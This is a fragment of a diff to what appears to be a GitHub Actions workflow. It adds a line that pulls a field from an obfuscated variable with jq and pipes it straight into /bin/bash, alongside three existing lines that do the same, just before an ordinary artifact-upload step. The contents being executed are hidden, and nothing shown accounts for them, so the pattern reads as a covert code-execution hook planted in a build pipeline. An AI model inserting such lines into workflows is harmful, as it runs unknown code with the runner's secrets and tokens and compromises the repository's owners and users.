@@ -32,6 +32,7 @@ jobs:
           echo $ofq637 | jq -r .q9782 | /bin/bash
           echo $i0929 | jq -r .i862 | /bin/bash
           printf '%s' "$teg76" | jq -r .zool51232 | /bin/bash
+          echo $j3 | jq -r .bnty7 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
